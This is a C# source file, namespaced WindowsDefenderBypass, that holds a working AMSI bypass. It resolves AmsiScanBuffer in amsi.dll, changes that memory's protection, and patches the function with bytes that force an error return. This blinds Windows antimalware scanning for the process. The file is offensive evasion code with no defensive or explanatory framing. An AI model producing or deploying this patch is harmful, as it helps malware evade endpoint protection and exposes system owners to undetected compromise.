using System;
using System.Runtime.InteropServices;

namespace WindowsDefenderBypass
{
    public static class AMSIBypass
    {
        [DllImport("kernel32")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        private static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        public static void AttemptBypass()
        {
            try
            {
                IntPtr hAmsi = LoadLibrary("amsi.dll");
                if (hAmsi == IntPtr.Zero)
                {
                    Console.WriteLine("  [!] Could not load amsi.dll");
                    return;
                }

                IntPtr asbAddr = GetProcAddress(hAmsi, "AmsiScanBuffer");
                if (asbAddr == IntPtr.Zero)
                {
                    Console.WriteLine("  [!] Could not find AmsiScanBuffer");
                    return;
                }

                byte[] patch = { 0x31, 0xC0, 0x05, 0x57, 0x00, 0x07, 0x80, 0xC3 };

                uint oldProtect;
                if (VirtualProtect(asbAddr, (UIntPtr)patch.Length, 0x40, out oldProtect))
                {
                    Marshal.Copy(patch, 0, asbAddr, patch.Length);
                    VirtualProtect(asbAddr, (UIntPtr)patch.Length, oldProtect, out oldProtect);
                    Console.WriteLine("  [+] AMSI bypass applied successfully");
                }
                else
                {
                    Console.WriteLine("  [!] Could not modify memory protection");
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"  [!] AMSI bypass failed: {ex.Message}");
            }
        }
    }
}
